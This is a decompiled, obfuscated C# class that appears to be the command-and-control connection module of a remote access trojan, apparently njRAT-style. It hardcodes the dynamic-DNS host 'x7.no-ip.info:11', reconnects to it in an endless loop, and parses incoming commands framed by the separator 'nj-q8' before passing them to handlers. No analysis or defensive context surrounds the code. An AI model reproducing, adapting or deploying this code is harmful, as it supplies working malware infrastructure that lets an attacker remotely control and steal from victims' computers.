using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public sealed class GClass3
{
	public delegate void GDelegate0();

	public delegate void GDelegate1();

	public delegate void GDelegate2(byte[] byte_0);

	private GDelegate0 gdelegate0_0;

	private GDelegate1 gdelegate1_0;

	private GDelegate2 gdelegate2_0;

	public static TcpClient tcpClient_0;

	public static string string_0 = "x7.no-ip.info:11";

	private static bool bool_0 = false;

	private static bool bool_1 = false;

	private string string_1;

	public GClass3()
	{
		string_1 = "nj-q8";
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	public void method_0(GDelegate0 gdelegate0_1)
	{
		gdelegate0_0 = (GDelegate0)Delegate.Combine(gdelegate0_0, gdelegate0_1);
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	public void method_1(GDelegate0 gdelegate0_1)
	{
		gdelegate0_0 = (GDelegate0)Delegate.Remove(gdelegate0_0, gdelegate0_1);
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	public void method_2(GDelegate1 gdelegate1_1)
	{
		gdelegate1_0 = (GDelegate1)Delegate.Combine(gdelegate1_0, gdelegate1_1);
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	public void method_3(GDelegate1 gdelegate1_1)
	{
		gdelegate1_0 = (GDelegate1)Delegate.Remove(gdelegate1_0, gdelegate1_1);
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	public void method_4(GDelegate2 gdelegate2_1)
	{
		gdelegate2_0 = (GDelegate2)Delegate.Combine(gdelegate2_0, gdelegate2_1);
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	public void method_5(GDelegate2 gdelegate2_1)
	{
		gdelegate2_0 = (GDelegate2)Delegate.Remove(gdelegate2_0, gdelegate2_1);
	}

	private bool method_6()
	{
		try
		{
			tcpClient_0.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		tcpClient_0 = new TcpClient();
		try
		{
			tcpClient_0.Client.Connect(Strings.Split(string_0, ":", -1, (CompareMethod)0)[0], Conversions.ToInteger(Strings.Split(string_0, ":", -1, (CompareMethod)0)[1]));
			tcpClient_0.Client.SendBufferSize = 999999;
			tcpClient_0.Client.ReceiveBufferSize = 999999;
			tcpClient_0.Client.SendTimeout = -1;
			tcpClient_0.Client.ReceiveTimeout = -1;
			Thread thread = new Thread(method_11, 100);
			thread.Start();
			return true;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public void method_7()
	{
		while (true)
		{
			Thread.Sleep(1500);
			if (!Class7.bool_0)
			{
				if (bool_0)
				{
					bool_1 = true;
					continue;
				}
				bool_1 = false;
				bool_0 = false;
				method_6();
			}
		}
	}

	public void method_8()
	{
		try
		{
			tcpClient_0.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public bool method_9(byte[] byte_0)
	{
		bool result = default(bool);
		if (Class7.bool_0)
		{
			try
			{
				MemoryStream memoryStream = new MemoryStream();
				memoryStream.Write(byte_0, 0, byte_0.Length);
				memoryStream.Write(Class7.smethod_0(ref string_1), 0, string_1.Length);
				tcpClient_0.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
				return true;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				result = false;
				ProjectData.ClearProjectError();
				return result;
			}
		}
		return result;
	}

	public bool method_10(string string_2)
	{
		return method_9(Class7.smethod_0(ref string_2));
	}

	public void method_11()
	{
		gdelegate0_0?.Invoke();
		bool_0 = true;
		bool_1 = false;
		int num = 0;
		MemoryStream memoryStream = new MemoryStream();
		checked
		{
			while (true)
			{
				num++;
				if (!bool_0 | bool_1)
				{
					break;
				}
				try
				{
					if (tcpClient_0 == null || !tcpClient_0.Client.Connected)
					{
						break;
					}
					if (tcpClient_0.Client.Available > 0)
					{
						byte[] array = new byte[tcpClient_0.Client.Available - 1 + 1];
						tcpClient_0.Client.Receive(array, 0, array.Length, SocketFlags.None);
						memoryStream.Write(array, 0, array.Length);
					}
					while (true)
					{
						byte[] byte_ = memoryStream.ToArray();
						if (!Class7.smethod_1(ref byte_).Contains(string_1))
						{
							break;
						}
						Array array2 = method_12(memoryStream.ToArray());
						gdelegate2_0?.Invoke((byte[])NewLateBinding.LateIndexGet((object)array2, new object[1] { 0 }, (string[])null));
						memoryStream.Dispose();
						memoryStream = new MemoryStream();
						if (array2.Length != 2)
						{
							break;
						}
						memoryStream.Write((byte[])NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null), 0, Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null), (Type)null, "length", new object[0], (string[])null, (Type[])null, (bool[])null)));
					}
					if (num <= 300)
					{
						goto IL_01c9;
					}
					num = 0;
					if (!tcpClient_0.Client.Connected)
					{
						break;
					}
					try
					{
						if (tcpClient_0.Client.Poll(-1, SelectMode.SelectRead) & (tcpClient_0.Client.Available <= 0))
						{
							break;
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						goto end_IL_0029;
					}
					goto IL_01c9;
					IL_01c9:
					Thread.Sleep(1);
					continue;
					end_IL_0029:;
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				break;
			}
			bool_0 = false;
			gdelegate1_0?.Invoke();
		}
	}

	public Array method_12(byte[] byte_0)
	{
		List<byte[]> list = new List<byte[]>();
		MemoryStream memoryStream = new MemoryStream();
		MemoryStream memoryStream2 = new MemoryStream();
		string[] array = Strings.Split(Class7.smethod_1(ref byte_0), string_1, -1, (CompareMethod)0);
		memoryStream.Write(byte_0, 0, array[0].Length);
		checked
		{
			memoryStream2.Write(byte_0, array[0].Length + string_1.Length, byte_0.Length - (array[0].Length + string_1.Length));
			list.Add(memoryStream.ToArray());
			list.Add(memoryStream2.ToArray());
			memoryStream.Dispose();
			memoryStream2.Dispose();
			return list.ToArray();
		}
	}
}
